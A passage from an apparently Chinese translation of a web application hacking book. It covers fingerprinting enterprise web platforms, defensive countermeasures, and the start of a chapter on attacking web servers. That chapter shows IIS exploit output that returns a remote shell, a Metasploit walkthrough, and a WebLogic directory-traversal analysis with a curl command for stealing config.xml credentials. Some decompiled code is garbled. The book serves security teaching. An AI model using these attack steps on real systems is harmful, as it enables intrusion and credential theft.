HTTP request sent, awaiting response... 200 OK
Length: 251 [text/html]
OK
100% @ 21.19 KB/s
...continues for entire site...

Wget 的目的很简单：从站点获得文件。对结果进行筛查需要其他一些简单的命令行工具，这些工具在任何 UNIX 系统或 Windows Cygwin 下都可找到。

Teleport Pro 当然，对于 Windows 用户来说，总是有一些 GUI 的东西。Teleport Pro（www.tenmax.com/teleport/pro/home.htm）将图形接口带到 Wget 功能中，并添加了对收集的信息进行审查的工具。

有了 Teleport Pro，你可以指定从 URL 的任意部分启动网络蜘蛛，控制它索引文件的深度和类型，并保存为本地副本。该工具最大的缺点是用 Teleport Pro 工程文件保存镜像的站点，该 TPP 文件不能使用诸如 grep 之类的工具进行搜索。Teleport Pro 如图 2-5 所示。

 </div>

Black Widow Black Widow 提供了一个用于搜索和收集指定信息的界面，扩展了 Teleport Pro 的功能。Black Widow 的另一个好处是你可以下载文件到你的硬盘驱动器的某个目录下。该目录对 grep 和 findstr 这类工具都是兼容的。Black Widow 如图 2-6 所示。

 </div>

Offline Explorer Pro Offline Explorer Pro 是一个 Win32 商业软件, 它允许黑客下载无限数目的 Web 站点和 FTP 站点, 之后用来离线查看、编辑和浏览。它同样支持 HTTPS 和多种认证协议, 包括 NTLM（只需在给定工程的“文件”|“属性”|“高级”|“密码”下的认证配置页面中, 使用域/用户名语法）。我们将在第 5 章中更详细地讨论 Offline Explorer Pro, 但由于它是我们最喜欢的自动化爬行工具之一, 在这里也提一下。

#### 2.2.4 常见 Web 应用剖析

我们已经介绍了许多 Web 应用程序剖析技术,从手工检查到使用诸如 Google 的 Internet 搜索引擎,再到自动化爬行工具。现在,让我们在几个常见的现成的企业应用程序上应用这些技术,举例说明如何使用这些简单的方法识别出它们。

##### Oracle 应用程序服务器

大多数 Oracle 应用程序都包含了一个主要的子目录，叫做/pls/。应用程序的所有东西都挂在这个地方。/pls/目录实际上是 Oracle 的 PL/SQL 模块，它后面的所有内容都是调用参数。为了帮助你理解，看一下这个 Oracle 应用程序的 URL:

http://site.com/pls/Index/CATALOG.PROGRAM_TEXT_RPT?p_arg_names=prog_nbr&p_arg_values=39.001

在这个例子中，/pls/是 PL/SQL 网关，/Index/是数据库访问描述符，CATALOG.是一个 PL/SQL 包，拥有 PROGRAM_TEXT_RPT 程序，该程序可以接受 URL 中余下的参数。

判断 Oracle 服务器的方法非常简单，因为 www.site.com/pls/目录是一个绝好的暗示。同时，Oracle 对脚本和 PL/SQL 包的命名习惯是用整词，比如，somename.someothername 等，这是 Oracle 服务器的另一个证据符号。通常，Oracle 的名字用全部大写的字母，诸如 NAME.SOMENAME。另外，许多 Oracle 名字以诸如.show 这样的形式结尾，或者看起来像下面这样的 URL:

http://www.site.com/cs/Lookup/Main.show?id=4592

当你看见这个类型的结构时，这个应用程序很有可能就是一个 Oracle 应用程序。

##### BroadVision

下面是一个 BroadVision 的 URL 例子。我们在该例子中放入了粗体的数字，以突出显示一些关键的特性。

http://www.site.com/bvsn/bvcom/ep/

programView.(2)do?(3)pageTypeId=8155&programPage=/jsp/www/content/

generalContentBody.jsp&programId=8287&channelId=-8246&(1)BV_

SessionID=NNNN1053790113.1124917482NNNN&BV_

EngineID=cccdaddehfhhlejcefecefeghhdfjl.0

1. 这里最要命的特征是叫做 BV_SessionID 和 BV_EngineID 的参数名。如果你在 URL 的任何地方看见了它俩，你可以肯定这是 BroadVision 应用程序。还有比这更简单的事吗？

2. BroadVision 应用程序经常有.do 的脚本扩展。

3. 大多数 BroadVision 应用程序有参数名以 xxxxId=nnnn 为结尾的现象。通过查看上面这个 URL，你可以发现有三个参数以这种方法命名（pageTypeId=8155，programId=8287，channelId=-8246）。大写的 I 和小写的 d 是 ID 独特的拼写方式，而且 ID 值通常包含了四位或者更多位的数字。这是一个不需要明显线索而检测出 BroadVision 的好方法。

下面是另一个 BroadVision 的 URL 例子。

http://www.site.com/store/stores/

Main.jsp?pagetype=careers&template=Careers.jsp&categoryOId=-8247&catId=-8247&subCatOId=-8320&subtemplate=Content.jsp

第一眼我们就有理由怀疑是 BroadVision，因为 ID 中的小写 d，参数值中有熟悉的四位或更多位的数字。另一个增强我们信心的线索是这些值为负数——在 BroadVision 应用程序中，你可以看见很多负数。

#### PeopleSoft

下面是一个 PeopleSoft 的 URL 例子。我们再次在例子中放入粗体的数字，以突出显示一些关键的特性。

http://www.site.com/psp/hrprd/(3)EMPLOYEE/HRMS/c/ROLE_APPLICANT.ER_APPLICANT_HOME(1).GBL?(2)NAVSTACK=Clear

1. 该文件的扩展名是明显的证据。.GBL 存在于大多数运行 PeopleSoft 站点的 URL 中。

2. NAVSTACK=同样也是大多数 PeopleSoft 安装程序中所常见的。但是请小心，也有很多 PeopleSoft 安装程序没有该参数。

3. PeopleSoft 中的目录和文件名倾向于全部大写。

另一条暴露 PeopleSoft 的特征是 Cookie。PeopleSoft 通常设置如下的 Cookie:

PORTAL-PSJSESSIONID=DMSdZJqswzuIRu4n;

PS_

TOKEN=AAAAAqwECAwQAAQAAAAACvAAAAAAAAAsAARTaGRyAgBOdwgAOAAAuADEAMBrdSiXqlmqzlHTJ9ua5ijzbhrj7eQAAAGsABVNKYXRhX3icHYlbCKBQFEWXRz4MwRzodvMaAPElmYDkS0k+FIMzONs9q7PatYDb84MQD53//

k5oebiYWTjFzsagfXBFSgNdTM/EqG9yLEYUpHITW3K3KzLXfheycZSqJR97+g5L;

PS_TOKENEXPIRE=24_Aug_2005_17:25:08_GMT;

PS_LOGINLIST=http://www.site.com/hrprd;

在大部分 PeopleSoft 应用中，你经常会看到 PORTAL-PSJSESSIONID Cookie。而其他三种 Cookie 不会那么常见。在大多数情况下，你会发现识别 PeopleSoft 很简单，因为多数情况下它清楚地在 URL 中标识出来。但是，你不能仅依赖 URL 来认出 PeopleSoft。很多时候，开发者定制他们的应用程序时做了很大的修改，导致识别出真正运行的是什么应用程序很困难。因此，我们会花一些时间讨论 PeopleSoft 应用程序看起来是怎么样的。当你对 Web 应用程序有了更多的经验后，尝试通过它的行为和“感觉”认出运行的是什么应用程序就会变得很简单。

像很多应用程序一样，PeopleSoft 拥有独特的展现方式。多数 PeopleSoft 程序界面在左边有一个菜单，右边是一个大的框架。当单击左边的菜单项时（通常情况下它们就是 URL），你会看见 URL 因你的点击而改变，页面会在右边的框架中载入。右边页面的内容通常是用很多 JavaScript 编写的脚本，链接和按钮通常是启动某种类型的 JavaScript 动作。这就是鼠标经过链接时，你经常看见大量 “javascript:” 链接的原因，这些链接执行提交命令或打开一个新的窗口。这是我们可以立即认出 PeopleSoft 应用程序的原因之一。

因为大多数 Web 应用服务器都是高度可定制的，如果没有研究 URL 或者技术规范手册，区别各种 Web 服务器是很困难的。但是我们可以寻找一些微妙的东西，来帮助我们指

出运行的是什么应用程序。比如，PeopleSoft 是高度可定制的，因此通过标准剖析方法，如 URL 或查询语句，来识别 PeopleSoft 是很困难的。但是大多数 PeopleSoft 应用程序很容易通过使用的界面组件来区分。举个例子，在下面两个屏幕快照中，你可以看见一个已知是 PeopleSoft 程序的菜单和标准登录界面。

下面显示的是一个怀疑为 PeopleSoft 应用程序的屏幕快照，但是 URL（https://www.site.com/n/signon.html）不是 PeopleSoft 通常的参数结构。

If you forgot your password and you have previously stored a password online.

将这篇快照的外观和风格与先前显示的已知是 PeopleSoft 的菜单进行对比。看一下菜单，它们是多么的相像啊！PeopleSoft 的菜单的形状通常非常像正方形，像 Xwindows 一样，而且它们在所有选项之前通常有一个负号 “-”。注意，菜单的字体，大小和颜色是多么地相似！同样，请注意 “Continue” 按钮的颜色和形状。

你看到按钮的颜色和外观是多么的相像了吗？只需看看这个，我们就能判断这个应用程序运行的是 PeopleSoft。另一个例子是 Lotus Domino，Lotus 大量使用可扩展树，而且通常它们给人一种引人注目的感觉。比如，对于折叠的树和展开的树，都有一个箭头指向它们。如果我们看到或感觉到一个 Web 站点中的树有这样的行为，这就是表明该站点使用的是 Domino 应用程序的线索。

##### Lotus Domino

到现在，你应该开始了解如何快速在一个 URL 中选择区域进行寻找，从而识别出运行的是什么应用程序。让我们看看如何确定运行的是否为 Lotus Domino 程序。

下面是一个 Lotus Domino 的 URL 例子，我们仍然在例子中放入粗体的数字，以突出显示某些关键的特性。

http://www.site.com/realtor(1).nsf/pages/
MeetingsSpeakers(2)?OpenDocument
http://www.site.com/DLE/rap.nsf/files/InstructionsforRequestForm/$file/
InstructionsforRequestForm.doc
http://www.site.com/global/anyzh/dand.nsf!OpenDatabase&db=/global/gad/
gad02173.nsf&v=10E6&e=us&m=100A&c=7A98EB444439E608C1256D630055064E

1. 常见的扩展名是.nsf。注意，扩展名是.nsf，而该文件后面看起来像目录的实际上是参数。realtor.nsf 是唯一的文件，后面跟着的是给文件的参数。

2. OpenDocument 是一种 Lotus 动作，还有其他很多种类似的动作。

##### WebSphere

下面是一个 WebSphere 的 URL 例子，我们仍然在例子中放入粗体的数字，以突出显示某些关键的特性。

http://www.site.com/webapp/commerce/command/(1)ExecMacro/site/macros/proddisp.(2)d2w/(3)report?prrfnbr=3928&prmenbr=991&CATE=&grupo=·

1. 在路径中寻找这些关键字：/ExecMacro/，/ncommerce3/和/Macro/。

2. 寻找扩展名.d2w。

3. WebSphere 倾向于有/report?参数。

WebSphere 通常有如下的会话 cookie:

SESSION_ID=28068215, VzdMyHgX2ZC7VyJcXvpfcLmELUhRHYdM91+BbJJYZbAtK7Rxt11NpyowkUAtcTOM;

### 2.3 常用对抗措施

正如我们已经看到的那样，剖析 Web 应用的大部分过程，都是利用了应用程序的设计者所设计的功能——毕竟，他们希望你能快速轻松地浏览站点。但是，我们也看到了许多站点内容和功能，不恰当暴露给了匿名浏览器，这是由于一些常见的站点设计习惯和错误配置造成的。这一节介绍应用程序设计者可以执行的方法，从而多多少少地防止信息泄漏。

#### 2.3.1 一条警示

在看到 Web 应用程序通常会泄漏哪些信息之后，你可能想大幅削减站点的内容和功能了。我们建议你谨慎行事，或者换一种方法。Web 管理员的目标是尽可能地确保 Web 服务器安全。通过加强配置和最小权限访问策略，绝大多数信息泄漏都可以被制止在服务器级。其他方法则需要程序员方采取行动。请记住 Web 应用程序是设计来向用户提供信息的，仅仅因为一个用户可以下载应用程序的 local.js 文件并不意味着应用程序的设计有问题。但是，如果 local.js 文件包含有连向应用程序数据库的用户名和密码，那么这个系统就会被攻破。

#### 2.3.2 保护目录

就像我们在本章中多次看见的那样，目录是对抗纠缠不休的调查者的第一道防线。以下是保护它们秘密性的一些方法。

##### Location 头

你可以在重定向中限制 Location 头内容，这样不会显示出 Web 服务器的 IP 地址。Web 服务器的 IP 地址会把攻击者带向带有错误配置和漏洞的服务器。

默认情况下，IIS 返回它的 IP 地址。为了返回完全限定的域名而不是 IP 地址，你需要修改 IIS 的 metabase 设置。在 Windows 2000 系统中，adsutil.vbs 脚本默认被安装在 Inetpub\adminscripts 目录下。

D:\Inetpub\adminscripts\adsutil.vbs set w3svc/UseHostName True
D:\Inetpub\adminscripts\net start w3svc

Apache 可以阻止目录枚举。在编译过程中删除 mod_dir 模块即可。这种更改很简单：

[root@meddle apache_1.3.23]# ./configure --disable-module=dir
Configuring for Apache, Version 1.3.23

##### 目录结构和位置

以下是一些保护 Web 目录的更多小技巧。

不同的用户/管理员根目录 对用户和管理员界面使用不同的 Web 文档根目录，这可以减轻源代码泄漏攻击和目录遍历攻击对应用程序功能的影响。

将/main/ 映射到 D:\IPub\pubroot\。

将/admin/ 映射到 E:\IPub\admroot\。

○ IIS 将 InetPub 目录放置到不同于系统盘的其他卷中，比如系统盘是 C:\WINNT，就放置到 D:\中（D:\InetPub）。这样可以防止目录遍历攻击接触到诸如

\WINNT\repair\sam 和 \WINNT\System32\cmd.exe 之类的敏感文件。

o Unix Web 服务器 把目录放在 chroot 环境下，可以减轻目录遍历攻击的影响。

#### 2.3.3 保护包含文件

对所有类型的包含文件来说，保护它们的最好方法就是确保它们不含有口令。这听起来微不足道，但任何时候一个密码以明文形式放在一个文件中，这个密码就被认为是不安全的。在 IIS 上，你可以将包含文件的常用扩展名（.inc）改为.asp，或者.将 inc 扩展名映射给 ASP 引擎。这会使它们在服务端被处理，从而防止在客户端浏览器上显示源代码。默认情况下，.inc 文件在浏览器中被认为是文本。记住，将其他脚本或内容中的所有引用，更改为改名后的包含文件。

#### 2.3.4 一些其他技巧

以下的小技巧可以帮助你的 Web 应用程序对抗本章中描述的调查技术。

- 将所有的 JavaScript 文件集中在一个单独的目录中。确保这一目录和其中的任何文件都没有“执行”权限（即，它们只能被 Web 服务器读取，而不能作为脚本执行）。

对于 IIS，将.inc, .js, .xsl 和其他包含文件放置于 Web 根目录之外，把它们打包在 COM 对象中。

- 去掉开发者的注释。在测试环境中，为了调试开发者的注释可以在代码中保留，但这些内容不应该在 Internet 上出现。

如果一个文件必须调用 Web 服务器上的其他文件，那么要使用与 Web 根目录或当前目录的相对路径名。不要使用包含了驱动盘符或 Web 文档根目录之外目录的完整路径名。另外，脚本自身应该去掉目录遍历字符（.../...）。

- 如果站点要求认证，应确保认证应用于整个目录和子目录。如果不支持匿名用户访问 ASP 文件，那么匿名用户同样应该不能访问 XSL 文件。

### 2.4 小结

所有方法学的第一步通常都是最关键的一步，剖析也不例外。本章介绍了剖析一个Web应用程序的流程，也从一个恶意攻击者的角度阐述了应用程序的架构。

首先, 我们讨论了所有应用相关构架的识别, 包括它们运行的服务, 对应的服务 banner。这是一张大画布上的第一笔, 我们会在本书的其余部分继续描绘画布中的其他内容。

接下来，我们介绍了对站点结构、内容和功能进行分类的方法，为本书中所描述的 Web

应用安全评估方法的后续步骤打下了良好的基础。因此，关键是要一贯和全面地执行这里所讨论的技术，从而确保从多个方面识别目标应用。根据目标应用程序的独特性，在使用我们描述的许多技术时都需要做微妙的变通。通常，调查者灵活的归纳推理会导致更完善的结果。虽然调查应用程序的很多流程都需要为输出的资源创建合法的请求，但我们提到了几种常见的编程习惯和错误配置，它们允许匿名客户端获得比它们应该获得的更多的信息。

最后，我们讨论了针对这些编程习惯和错误配置的一些对抗措施，用来阻止攻击者，防止攻击者获得他们的第一个立足之处而向应用实施更深入的攻击。

到现在，知道了 Web 服务软件的类型和版本，一个有头脑的入侵者首先寻求的是利用在剖析过程中发现的明显的漏洞。我们会在第 3 章中讲到用于 Web 平台攻击的工具和技术。另一方面，如果攻击者现在手中掌握了 Web 应用剖析详细信息，可能会开始寻求攻击应用本身，其使用的技术我们会在从第 4 章到第 12 章中进行讨论。

### 2.5 参考和进一步阅读

Web 服务器/应用程序 防火墙

Teros 应用防火墙

F5 的 TrafficShield 应用防火墙

http://www.teros.com

Netcontinuum Web 应用防火墙

http://www.f5.com

微软的 URLScan

http://www.netcontinuum.com

http://www.microsoft.com/technet/

Eye 的 SecureIIS

security/tools/urlscan.mspx

http://www.eeye.com

Web 搜索引擎

Google

MSN Search

http://www.google.com

Yahoo! Search

http://search.msn.com

http://search.yahoo.com

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Web 爬行工具</td><td style='text-align: center; word-wrap: break-word;'>http://lynx.browser.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Lynx</td><td style='text-align: center; word-wrap: break-word;'>http://www.gnu.org/directory/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Wget</td><td style='text-align: center; word-wrap: break-word;'>wget.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Teleport Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.tenmax.com/teleport/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Black Widow</td><td style='text-align: center; word-wrap: break-word;'>http://www.softbytelabs.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Offline Explorer Pro</td><td style='text-align: center; word-wrap: break-word;'>Black Widow/</td></tr></table>

HTML4.01 表单规范

PHP 脚本语言

http://www.w3.org/TR/html401/

interact/forms.html

ASP.NET 脚本语言

http://www.php.net/

File Extension Source, 一个数据库, 指明了文件扩展名和使用这些扩展名的程序

《黑客大曝光：网络安全机密与解决方案》第5版（Hacking Exposed: Network Security Secrets & Solutions, Scambray & Kurtz, Osborne/McGraw-Hill, 2005）

http://www.asp.net/

http://filext.com/

ISBN 0-07-226081-5

## 第 3 章 攻击 Web 平台

入侵者首先会寻求利用 Web 应用程序中最吸引人的部分：Web 平台（Web platform）中的漏洞。Web 平台由常见的（不一定是商业的！）的现成软件（Common off-the-shelf Software，COTS）组成，它们位于主机操作系统之上，但是位于自定制的应用程序逻辑层之下。Web 平台通常包括：

O COTS Web 服务器软件（比如 IIS 或 Apache）。

○ Web 服务器的 COTS 扩展，比如 ISAPI 过滤和扩展，或者 Apache mod 包。

O COTS 动态执行环境，比如 ASP.NET，PHP 和 J2EE（也被认为是应用程序服务器）。

○ COTS 服务/后台程序，比如用户论坛或 Web 客户包。

与我们所定义的 Web 平台相对应，我们认为应用层组件可以是非 COTS 的任何东西，因此，每个站点或应用程序都是唯一的。举个例子，Google 的搜索引擎逻辑，就可以归为应用层。

在本章中，我们只会讨论 Web 平台漏洞这类问题。进一步明确地说，就是只把讨论的重点集中在 COTS 软件的缺陷而不是错误配置上。这样做是为了提醒读者注意。我们认为 Web 平台漏洞分为两类：一类是 Web 站点管理员和开发者可以直接修复的漏洞，而另一类是必须依靠软件提供商通过版本更新和补丁来修复的漏洞。我们会在第 10 章中讨论错误配置的漏洞。

同样, 在本章中, 我们将主要讨论会导致 Web 平台机密性或完整性受到破坏的漏洞上。而针对 Web 平台和应用程序可用性的拒绝服务（DoS）攻击, 请查看第 11 章。

最后，关于范围的说明：本章会集中在 Web 平台攻击和对抗措施的具体细节上，基本上使用小型的工具和技术。请参看第 13 章（第 2 版新增的内容），整整的一章叙述了使用 Web 安全漏洞扫描器进行大规模自动化评估 Web 安全的内容。

在历史上，利用 COTS Web 服务器软件漏洞是攻击一个 Web 站点最简单的方法之一。但近年来，由于其产品多年来受到了攻击者沉重的打击，许多主流 Web 服务器软件的开发者们的安全意识与日俱增。微软的 IIS 就是该现象的一个例子。虽然过去在 IIS 产品中时不

时地发现严重的漏洞，但最新版本 IIS 6 相对来说还未发现重大漏洞，这很大程度上是因为微软在 IIS 6 开发流程中非常注重安全性。

当然，这并不意味着你可以忽略 Web 平台漏洞。我们已经看到，仅仅是上万种 Web 服务器漏洞中的 6 种，就可以在几天内危及整个全球企业。更糟糕的是，当我们在本章中演示的时候，黑客团体仍在继续改进他们的工具箱，使他们可以更容易地识别和攻击这样的漏洞。

本章会描述如何发现、攻击和防范主流 Web 平台中的常见安全漏洞。我们的讨论将分为如下部分：

○ 使用工具点击式的漏洞利用

☐ 手工漏洞利用

☐ 检测绕过技术

像前面各章那样，我们将阐述常见的对抗措施和安全最佳实践，用来对抗这些攻击。

### 3.1 使用 Metasploit 进行点击式的漏洞利用

Metasploit 框架是一个用于开发、测试和启动攻击代码的开源平台。通过插件攻击模块，很容易增强 Metasploit 框架的功能，这些插件可以由全世界范围内的民间组织提供。根据 Metasploit Web 站点上的描述，这些插件“只能用于合法的渗透测试和研究目的”。Metasploit 能够运行在拥有 Perl 的大多数 Linux/UNIX 平台上。对 Windows 系统也提供了一个基于 Cygwin 的版本。Metasploit 提供了攻击所有类型漏洞的轻松方法，其中也包括 Web 平台漏洞。对类似 Metasploit 的商业支持工具感兴趣的人，可以查看 Core Security Technologies 的 CORE IMPACT，或者 Immunity 的 CANVAS。关于 Metasploit，CORE IMPACT 和 CANVAS 进一步信息的链接，请参见本章末尾的“参考和进一步阅读”。

为了了解 Metasploit 的易用性，我们首先看一个不用 Metasploit，用传统的方法攻击常见 Web 平台软件缺陷的例子。就像我们在第 2 章中看到的那样，获悉 Web 服务器的系统和版本是很容易的事情。同样，调查已知服务器软件的公开漏洞也不是件耗费精力的事。我们以 IIS 的 SSL PCT 远程缓冲区溢出漏洞为例子，该漏洞在微软安全公告 “MS04-011” 中有所描述。现在攻击者需要做的事情就是找一些攻击代码。对于这个例子，我们到 www.k-otik.com 就可以找到一个非常有用的、攻击 SSL PCT 漏洞的软件包。

在下载了攻击代码后，命名为 iisexploit.c，并尝试编译它。对一般的脚本小子来说，编译攻击代码并不是一件简单的工作，特别是当代码来自不同的地方，通过粗糙的拼接放在一起的时候（通常是有人故意这样做的）。经过一段时间后，我们解决了一些缺少头文

件、缺少库、非法引用等编译器错误，又通过 Google 搜索知道了如何设置基本的编译参数，便拥有了可以运行的 iisexploit.exe。

相对于编译来说，从命令行启动 iisexploit.exe 非常简单：

C:\\iisexploit www.site.com myserver 8082
THCIISSLame v0.3 - IIS 5.0 SSL remote root exploit
tested on Windows 2000 Server german/english SP4
by Johnny Cyberpunk (jcyberpunk@thc.org)
[*] building buffer
[*] connecting the target
[*] exploit send
[*] waiting for shell
[*] Exploit successful ! Have fun !

攻击在预先确定的 8082 端口返回了一个 Shell 给攻击者系统。就像你刚刚看到的那样，攻击一个已知的漏洞是相当简单的，并不需要太多的工作。但是对于我们要求立竿见影的行事风格而言，刚才经历的过程还是太复杂了。而且坦白地说，我们很懒而且还要写书，没有那么多时间，因此我们希望有更简单的方法，幸运的是，有不少很有用的应用程序可以自动化完成整个过程。

现在，我们对同样的例子使用 Metasploit，来说明即使在不太熟练的人的手中，该工具也能有巨大的威力和效率。我们首先获取已发布的该平台版本，然后安装。几分钟后，我们就可以浏览预先装好的攻击代码了。Metasploit 甚至还提供了一个快速安装向导，多么方便啊——而人们还以为攻击是件困难的工作呢。一旦安装完毕，Metasploit 就可以通过命令行或者 Web 界面访问。因为我们更习惯于用 Web 应用程序，因此在我们的演示中将使用 Web 用户图形界面。

启动了 Metasploit 后，我们可以看见它支持的所有漏洞利用代码的列表，如图 3-1 所示。

我们可以看见有针对微软 SSL PCT 溢出的利用代码，选择它。Metasploit 就会显示一个帮助界面，提供关于此漏洞的描述，并带有参考资料。在如图 3-2 所示的界面中，我们选择目标运行的系统类型。由前期的调查知道，Web 服务器运行的是 Win2K SP1，因此我们选择该版本。

在选择了目标之后, Metasploit 在下一屏中显示了供我们选择的几种可发送给服务器的载荷。对于这个攻击来说，一个简单的远程 Shell 就是很好的选择。一旦我们单击“漏洞利用”（Exploits）按钮，Metasploit 就会显示载荷发送成功的状态，并为我们提供对远程服务器访问的控制台，如图 3-3 所示。

 </div>

 </div>

看见有多容易了吗？那其中的乐趣在哪里呢？

 </div>

### 3.2 手工漏洞利用

我们先向你展示简单的方法，因为这可能是大部分攻击采用的方法（因为大多数恶意攻击都会选择障碍最少的路）。但是，更老练的攻击者可能会花费更多的时间和精力来攻陷 Web 服务器，因此，我们在本节中花点时间，演示一些更精细的手工攻击。和 Metasploit 例子相反，在本例中值得注意的关键是，识别和攻击漏洞需要更多的时间和技能。另一点是：不要以为你运行的 Web 平台没有受到像 Metasploit 那些项目的关注，就意味着你不易遭受攻击。

#### BEA—WebLogic 远程管理功能漏洞利用

流行度：6
简单度：3
影响度：9
风险度：6

2003 年 2 月，SPI Dynamics 的 Kevin Spett 发现了 BEA WebLogic 的远程管理功能中的一个漏洞。该漏洞允许攻击者创建一个头部带有命令的特殊的 HTTP 请求，以实现对 WebLogic 服务器的远程完全控制。WebLogic 是一个流行的 J2EE 平台，通常用来运行 Web 应用程序，它被认为是当今可用的顶级 Web 应用服务器之一。

注意 据传闻，轰动一时的 2005 年社交名媛 Paris Hilton 的 T-Mobile Sidekick 电话泄漏信息到整个因特网的事件，就是基于该漏洞的。给 Paris 和 T-Mobile 的教训是：赶紧修补系统。

我们会重建导致发现和验证该漏洞的后台事件的次序，这样就可以搞清楚 Web 平台漏洞研究背后的思想。

在这个例子中，识别漏洞的第一步是检查源代码。要检查 WebLogic 的源代码，首先需要做的是反编译。

WebLogic 中的许多组件都是用 Java 编写的，这是一个极好的切入点。现有一些可用的 Java 反编译器——在该调查中使用的是 jda（Java 反编译版）。它可以免费获得并可以在各种操作系统上运行（jad 的链接请参看“参考和进一步阅读”一节）。

我们在 Windows 上安装了 WebLogic 服务器（这里所述的流程对 UNIX 或 Linux 版本同样适用），然后检查所有安装时预配置的组件（因为它们广泛存在，因此很可能是攻击者的目标）。

当检查每个服务器的目录层次时，我们发现了一个叫做“.internal”的目录。它包含了两个.war文件：wl_management_internal1 和wl_management_internal2。在BEA的文档里，我们找不到关于这两个文件的任何信息。但对http://www.site.com/wl_management_internal2的一个快速请求却显示在该URL上清楚地配置了一些东西。从令人好奇的名字和缺乏文档等现象来看，这似乎是一个值得深入研究的地方。

.war 文件是一个包含一组 Web 应用程序的包。文件的格式是 Zip 格式，包含了两个主要的目录：META-INF 和 WEB-INF。META-INF 包含了关于包内容的元数据（metadata），而 WEB-INF 树包含了可执行 Java 类的层次结构，并描述了该如何配置包里应用程序的 web.xml 文件。wl_management_internal2 的 web.xml 文件描述了两个 Servlet: FileDistributionServlet 和 BootstrapServlet。FileDistributionServlet 的 .class 文件在 /WEB-INF/classes/weblogic/management/servlet/中，使用 jad 可以反编译 FileDistributionServlet.class 以看见源代码，其操作如下：

$ jad FileDistributionServlet.class
$ cat FileDistributionServlet.jad

输出的 FileDistributionServlet.jad 大约长 900 行。当检查代码以搜寻潜在的安全问题时，一个需要重点关注的地方是查找在哪里处理外部输入，本例中，就是查找 HTTP 请求。一旦我们发现了输入点，就很容易追踪应用程序对 HTTP 请求所采取的动作。在这个例子中，我们发现了两个函数是输入点：doGet() 和 doPost()。这两个函数处理 HTTP GET 和 POST 请求——搞定！下面是 FileDistributionServlet 的 doGet() 方法的一部分反编译代码：

public void doGet(HttpRequest httpRequest, HttpResponse httpResponse)
    throws ServletException, IOException
{

String sTemp = httprequest.getHeader("wl_request_type");
try
{
    // 多个if条件

    if (sTemp.equals("wl_comrequest"))
        doSomeRequest(httprequest, httpresponse);
    else
        if (sTemp.equals("wl_xml_entity_request"))
            doGetXMLRequest(httprequest, httpresponse);
    else
        if (sTemp.equals("wl_reprerequest") || sTemp.equals("wl_filerequest") || sTemp.equals("wl_managedrequest"))
        {
        // 复杂的认证过程
        catch(Exception loginerror)
            {
            MgmtLogger.logErrorServlet(sTemp, loginerror);
            httpresponse.send_Error(401, "Error authenticating user");
        }
    }
}

这段代码引用了一个叫做“wl_request_type”的 HTTP 头的值。这是很少见的，因为 HTTP 客户端通常使用 GET 请求和 POST 参数与应用程序进行通信。头部被客户端和服务器有意地使用，是为了设计 HTTP 交换本身的细节。“if”语句检查所提供的值是否有匹配的字符串，如果都不匹配，那么返回 400 请求错误给客户端。而对于匹配的值，其中三种请求类型“wl_request”，“wl_filerequest”和“wl_managedrequest”好像还要经过复杂的认证流程。而其他的只是简单地调用其他方法并将本来的请求传递过去。由于那三个值通过认证很好地保护了起来，所以我们对不需要任何认证的值做进一步的研究。其中一个，叫做“wl_xml_entity_request”，看起来好像有问题的样子。因此我们来更深入地挖掘一下。

下面是 wl_xml_entity_request 使用的方法的部分代码:

private void doGetXMLRequest(HttpRequest httpRequest, HttpResponse httpResponse)
    throws ServletException, IOException
{
    String sTemp = httpRequest.getHeader("xml-registry-name");
    String sTP = httpRequest.getHeader("xml-entity-path");
}

XMLDir xmlDir = new XMLDir(s);
InputStream inputStream = null;
byte abyte0[] = new byte[1000];
BufferedOutputStream outputStream = new BufferedOutputStream(httpresponse.getOutputStream());
try
{
    inputstream = xmldir.getEntity(sTP);
    int count;
    while((count = inputstream.read(abyte0)) != -1)
        outputstream.write(abyte0, 0, count);
}

该方法首先读取 HTTP 头的值，“xml-registry-name”和“xml-entity-path”。接下来，检查值是否为空或长度为零。然后，使用“xml-registryname”的值创建了一个 XMLDir 对象。在打开了 HttpResponse 对象的输出流之后，使用“xml-entity-path”头调用 XMLDir 的 getEntity()方法。该方法的输出在响应中返回。

因此，在 WebLogic 默认安装情况下的一个未文档化的应用程序，使用了客户端提供的输入，并通过它从一个叫做 XMLDir 的对象中获得数据。这看起来很像打开一个文件，并简单地把它的内容发送回客户端。显然不存在任何认证。下一步就是查看 XMLDir 对这些头部的值做了些什么。经过一番调查，我们在另一个 WebLogic 库 weblogic.jar 中发现了 XMLDir.class。就像 FileDistributionServlet 一样，它的源代码可以通过解压这个文件，再对它运行 jad 而获得：

$ unzip weblogic.jar weblogic/xml/registry/XMLDir.class
$ jad XMLDir.class

下面是 XMLDir 的相关源代码:

public XMLDir(String sTemp)
{
    ...
    registryName = sTemp;
}
public InputStream getSomeEntity(String sTemp)
    throws XMLRegistryException
{
    if(isEntityLocal())
        return getLocalEntity(s);
    else
    }
}

return getaRemoteEntity(s);
}
private InputStream getaLocalEntity(String s)
    throws XMLRegistryException
{
    DomainA domain = Admin.getDomain();

    String s2 = domain.getRootDirectory();
    File file = new File(s2, "xml/registries/" + registryName);
    File file1 = new File(file, s);

    try
    {
        return new FileInputStream(file1);
    }
}

在构造函数中，成员变量 registryName 被赋成 xml-registry-name 头的值。当调用 getSomeEntity()时，getLocalEntity()函数被触发。在 getLocalEntity 中，xml-registry-name 与一个预设的目录路径合在一起，并且打开一个该路径的文件对象。几行之后，目录中一个以 xml-entity-path 头命名的文件被打开，产生的文件会被返回。当从 FileDistributionServlet 中调用的时候，这个文件会被发送给客户端。

因此我们知道操纵 xml-registry-name 和 xml-entity-path 头的值，就可以执行目录遍历攻击，从而读取服务器上 WebLogic 账户有权限访问的任何文件。在 xml-registry-dir 中使用两个遍历字符（“../../”），就可以跳出预设的目录，使我们进入应用程序的 WEB-INF 目录。通过 xml-entity-path 简单地设置，就可以获取 config.xml 文件。config.xml 文件包含了各种关于应用程序的敏感信息，常常包括用户名和密码。该攻击请求可以通过 curl 程序创建出来：

$ curl -H "wl_request_type:wl_xml_entity_request" -H "xml-registryname:
    ./../" -H "xml-entity-path: config.xml" http://server/wl_
management_internal2/wl_management

以上代码会产生如下的 HTTP 请求:

